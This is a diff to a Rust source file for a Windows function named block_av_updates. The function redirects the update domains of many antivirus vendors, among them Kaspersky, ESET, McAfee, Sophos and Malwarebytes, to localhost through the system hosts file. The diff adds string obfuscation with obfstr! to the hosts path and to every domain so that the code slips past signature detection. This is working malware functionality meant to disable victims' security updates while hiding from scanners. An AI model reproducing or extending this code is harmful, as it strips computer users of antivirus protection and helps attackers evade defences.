@@ -5,9 +5,11 @@ use std::io::{Read, Write};
 #[cfg(windows)]
 use std::path::PathBuf;
 
+use obfstr::obfstr;
+
 #[cfg(windows)]
 pub fn block_av_updates() -> Result<(), Box<dyn std::error::Error>> {
-    let hosts_path = PathBuf::from("C:\\Windows\\System32\\drivers\\etc\\hosts");
+    let hosts_path = PathBuf::from(obfstr!("C:\\Windows\\System32\\drivers\\etc\\hosts"));
     
     if !hosts_path.exists() {
         return Ok(()); // Should exist on Windows
@@ -16,32 +18,32 @@ pub fn block_av_updates() -> Result<(), Box<dyn std::error::Error>> {
     // List of AV Update Domains to JAM (Redirect to localhost)
     let blocklist = vec![
         // Kaspersky
-        "kaspersky.com", "www.kaspersky.com", "update.kaspersky.com", "dnl-01.geo.kaspersky.com", "dnl-02.geo.kaspersky.com",
+        obfstr!("kaspersky.com"), obfstr!("www.kaspersky.com"), obfstr!("update.kaspersky.com"), obfstr!("dnl-01.geo.kaspersky.com"), obfstr!("dnl-02.geo.kaspersky.com"),
         
         // Bitdefender
-        "bitdefender.com", "www.bitdefender.com", "upd.bitdefender.com", "nimbus.bitdefender.net",
+        obfstr!("bitdefender.com"), obfstr!("www.bitdefender.com"), obfstr!("upd.bitdefender.com"), obfstr!("nimbus.bitdefender.net"),
         
         // ESET
-        "eset.com", "www.eset.com", "update.eset.com", "expire.eset.com",
+        obfstr!("eset.com"), obfstr!("www.eset.com"), obfstr!("update.eset.com"), obfstr!("expire.eset.com"),
         
         // Avast / AVG
-        "avast.com", "www.avast.com", "su.ff.avast.com", "p.ff.avast.com",
-        "avg.com", "www.avg.com", "update.avg.com",
+        obfstr!("avast.com"), obfstr!("www.avast.com"), obfstr!("su.ff.avast.com"), obfstr!("p.ff.avast.com"),
+        obfstr!("avg.com"), obfstr!("www.avg.com"), obfstr!("update.avg.com"),
         
         // McAfee
-        "mcafee.com", "www.mcafee.com", "update.mcafee.com", "liveupdate.mcafee.com",
+        obfstr!("mcafee.com"), obfstr!("www.mcafee.com"), obfstr!("update.mcafee.com"), obfstr!("liveupdate.mcafee.com"),
         
         // Symantec / Norton
-        "symantec.com", "norton.com", "liveupdate.symantecliveupdate.com", "update.symantec.com",
+        obfstr!("symantec.com"), obfstr!("norton.com"), obfstr!("liveupdate.symantecliveupdate.com"), obfstr!("update.symantec.com"),
         
         // Sophos
-        "sophos.com", "www.sophos.com", "d1.sophosupd.com", "d2.sophosupd.com",
+        obfstr!("sophos.com"), obfstr!("www.sophos.com"), obfstr!("d1.sophosupd.com"), obfstr!("d2.sophosupd.com"),
         
         // TrendMicro
-        "trendmicro.com", "www.trendmicro.com", "grid-global.trendmicro.com",
+        obfstr!("trendmicro.com"), obfstr!("www.trendmicro.com"), obfstr!("grid-global.trendmicro.com"),
         
         // Malwarebytes
-        "malwarebytes.com", "www.malwarebytes.com", "data-cdn.mbamupdates.com", "keystone.mwbsys.com"
+        obfstr!("malwarebytes.com"), obfstr!("www.malwarebytes.com"), obfstr!("data-cdn.mbamupdates.com"), obfstr!("keystone.mwbsys.com")
     ];
 
     let mut file = OpenOptions::new()
